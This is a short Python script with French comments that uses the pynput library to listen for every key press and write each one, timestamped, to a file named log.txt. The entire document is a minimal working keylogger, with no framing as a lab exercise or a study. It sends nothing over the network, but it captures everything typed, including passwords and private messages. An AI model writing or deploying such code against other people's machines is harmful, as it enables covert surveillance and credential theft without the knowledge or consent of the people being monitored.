from pynput.keyboard import Key, Listener
import logging
#Association du log au fichier log.txt
logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format="%(asctime)s - %(message)s")

#Retourne la saisie dans le fichier log
def on_press(key):
    logging.info(str(key))

#Mise en écoute
with Listener(on_press=on_press) as listener:
    listener.join()